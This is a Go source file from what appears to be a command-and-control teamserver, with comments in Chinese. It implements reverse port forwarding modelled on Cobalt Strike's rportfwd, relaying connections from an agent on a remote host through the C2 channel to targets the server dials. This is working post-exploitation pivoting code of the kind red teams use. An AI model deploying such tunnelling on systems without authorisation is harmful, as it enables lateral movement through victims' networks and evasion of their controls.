package pivot

// 反向端口转发(CS rportfwd 同类): Agent 侧监听 listen_port, 入站连接经
// C2 通道送到 Server, 由 Server 拨向 target_host:target_port。
//
// 建连流程:
//  1. 操作员 rportfwd <lport> <thost> <tport> → StartRportfwd: 下发
//     PivotRportfwdAdd(Agent 起 accept 监听) 并登记 rportfwds。
//  2. Agent accept 入站连接 → 生成 pivot_id → 推 PivotOpened
//     {pivot_id, listen_port, target_host, target_port}(先于任何 PivotData)。
//  3. handleOpen 校验登记项与目标一致 → 先登记 pending 占位(缓冲先手
//     数据) → goroutine 拨目标 → 拨通后回放缓冲 → 之后复用 socks 链路
//     同款双向管道(PivotData 上行写目标 / 目标读循环下推 PivotData)。
//
// 会话离线: closeSession 会同时清理该会话的登记与在途连接。

import (
	"fmt"
	"net"
	"time"

	"cleat/teamserver/internal/logx"
	"cleat/teamserver/internal/session"
)

// rportfwdPendingMax pending 阶段缓冲上限(拨号窗口内的先手数据, 1MB 足够)。
const rportfwdPendingMax = 1 << 20

// rportfwdEntry 一条反向端口转发登记。
type rportfwdEntry struct {
	SessionID  int
	ListenPort int
	TargetHost string
	TargetPort int
}

// RportfwdInfo 描述一条反向端口转发(REST/CLI 用)。
type RportfwdInfo struct {
	SessionID  int    `json:"session_id"`
	ListenPort int    `json:"listen_port"`
	TargetHost string `json:"target_host"`
	TargetPort int    `json:"target_port"`
}

func rportfwdKey(sid, listenPort int) string {
	return fmt.Sprintf("%d:%d", sid, listenPort)
}

// StartRportfwd 下发 PivotRportfwdAdd 并登记(Agent 端监听失败时返回错误)。
func (p *Pivot) StartRportfwd(sid int, listenPort int, targetHost string, targetPort int) error {
	if sid <= 0 {
		return fmt.Errorf("无效会话 #%d", sid)
	}
	if listenPort <= 0 || listenPort > 65535 || targetHost == "" ||
		targetPort <= 0 || targetPort > 65535 {
		return fmt.Errorf("端口/目标无效")
	}
	resp, err := p.mgr.APICommand(sid, session.CmdPivotRportfwdAdd, map[string]interface{}{
		"listen_port": listenPort,
		"target_host": targetHost,
		"target_port": targetPort,
	})
	if err != nil {
		return err
	}
	if resp == nil || resp["status"] != "success" {
		return fmt.Errorf("agent 拒绝: %v", resp)
	}
	p.rportfwdsMu.Lock()
	p.rportfwds[rportfwdKey(sid, listenPort)] = &rportfwdEntry{
		SessionID: sid, ListenPort: listenPort, TargetHost: targetHost, TargetPort: targetPort,
	}
	p.rportfwdsMu.Unlock()
	logx.Printf("[rportfwd] 会话 #%d 监听 :%d -> %s:%d\n", sid, listenPort, targetHost, targetPort)
	return nil
}

// StopRportfwd 下发 PivotRportfwdDel, 并关闭该监听在途的所有连接。
func (p *Pivot) StopRportfwd(sid int, listenPort int) error {
	resp, err := p.mgr.APICommand(sid, session.CmdPivotRportfwdDel, map[string]interface{}{
		"listen_port": listenPort,
	})
	if err != nil {
		return err
	}
	if resp == nil || resp["status"] != "success" {
		return fmt.Errorf("agent 拒绝: %v", resp)
	}
	p.removeRportfwd(sid, listenPort)
	return nil
}

// removeRportfwd 清登记 + 关闭该监听在途连接(含 pending 占位)并通知 Agent。
func (p *Pivot) removeRportfwd(sid, listenPort int) {
	p.rportfwdsMu.Lock()
	delete(p.rportfwds, rportfwdKey(sid, listenPort))
	p.rportfwdsMu.Unlock()

	p.pivotsMu.Lock()
	var victims []*pivotConn
	for id, pc := range p.pivots {
		if pc.sessionID == sid && pc.rportfwd && pc.listenPort == listenPort {
			victims = append(victims, pc)
			delete(p.pivots, id)
		}
	}
	p.pivotsMu.Unlock()
	for _, pc := range victims {
		pc.writeMu.Lock()
		pc.closed = true
		if pc.conn != nil {
			_ = pc.conn.Close()
		}
		pc.writeMu.Unlock()
		_ = p.pushClose(pc.pivotID, sid)
	}
}

// RportfwdInfos 返回 rportfwd 登记列表(REST/CLI 用)。
func (p *Pivot) RportfwdInfos() []RportfwdInfo {
	p.rportfwdsMu.Lock()
	defer p.rportfwdsMu.Unlock()
	out := make([]RportfwdInfo, 0, len(p.rportfwds))
	for _, e := range p.rportfwds {
		out = append(out, RportfwdInfo{
			SessionID: e.SessionID, ListenPort: e.ListenPort,
			TargetHost: e.TargetHost, TargetPort: e.TargetPort,
		})
	}
	return out
}

// handleOpen Agent 主动推送 PivotOpened: rportfwd 入站连接已接受。
// 拨目标可能阻塞(10s 超时), 而 Dispatch 在会话收帧循环内同步调用
// handler, 因此实际建连放在独立 goroutine; 先登记 pending 占位承接
// 立刻到来的 PivotData(handleData 的 rport-pending 分支缓冲)。
func (p *Pivot) handleOpen(s *session.Session, cmd string, params map[string]interface{}, bin []byte) {
	pivotID, _ := params["pivot_id"].(string)
	listenPort, _ := params["listen_port"].(float64)
	targetHost, _ := params["target_host"].(string)
	targetPort, _ := params["target_port"].(float64)
	if pivotID == "" || targetHost == "" || listenPort <= 0 || targetPort <= 0 {
		return
	}

	// 必须有登记项且目标一致才放行(防止伪造 PivotOpened 让 Server 任意拨号)
	p.rportfwdsMu.Lock()
	ent := p.rportfwds[rportfwdKey(s.ID(), int(listenPort))]
	p.rportfwdsMu.Unlock()
	if ent == nil || ent.TargetHost != targetHost || ent.TargetPort != int(targetPort) {
		logx.Printf("[rportfwd] 会话 #%d 拒绝未登记/不匹配的 PivotOpened %s (%s:%d)\n",
			s.ID(), pivotID, targetHost, int(targetPort))
		_ = p.pushClose(pivotID, s.ID())
		return
	}

	pc := &pivotConn{
		sessionID: s.ID(), pivotID: pivotID,
		conn:  nil,
		phase: "rport-pending",
	}
	pc.pendingBuf = make([]byte, 0, 4096)
	p.pivotsMu.Lock()
	p.pivots[pivotID] = pc
	p.pivotsMu.Unlock()

	go p.setupRportfwdConn(pc, ent, targetHost, int(targetPort))
}

// setupRportfwdConn 拨向目标; 拨通后接管 pending 占位并进入下行转发循环。
func (p *Pivot) setupRportfwdConn(pc *pivotConn, ent *rportfwdEntry, host string, port int) {
	defer logx.Guard("pivot-rportfwd-setup") // G3
	sid, pivotID := pc.sessionID, pc.pivotID
	conn, err := net.DialTimeout("tcp",
		net.JoinHostPort(host, fmt.Sprintf("%d", port)), 10*time.Second)
	if err != nil {
		logx.Printf("[rportfwd] 会话 #%d %s 拨目标失败 %s:%d: %v\n", sid, pivotID, host, port, err)
		p.pivotsMu.Lock()
		delete(p.pivots, pivotID)
		p.pivotsMu.Unlock()
		_ = p.pushClose(pivotID, sid)
		return
	}

	pc.writeMu.Lock()
	if pc.closed {
		// pending 阶段已被关闭(超限/Stop): 直接放弃
		pc.writeMu.Unlock()
		_ = conn.Close()
		p.pivotsMu.Lock()
		delete(p.pivots, pivotID)
		p.pivotsMu.Unlock()
		return
	}
	pc.conn = conn
	pc.phase = "open"
	if len(pc.pendingBuf) > 0 {
		_ = conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
		_, _ = conn.Write(pc.pendingBuf)
		pc.pendingBuf = nil
	}
	pc.writeMu.Unlock()

	logx.Printf("[rportfwd] 会话 #%d %s -> %s:%d\n", sid, pivotID, host, port)
	defer func() {
		p.pivotsMu.Lock()
		delete(p.pivots, pivotID)
		p.pivotsMu.Unlock()
		_ = conn.Close()
	}()
	// 目标 -> Agent 下推; 返回即连接结束, 通知 Agent 关闭对应入站连接
	p.relayToAgent(pivotID, sid, conn)
	_ = p.pushClose(pivotID, sid)
}
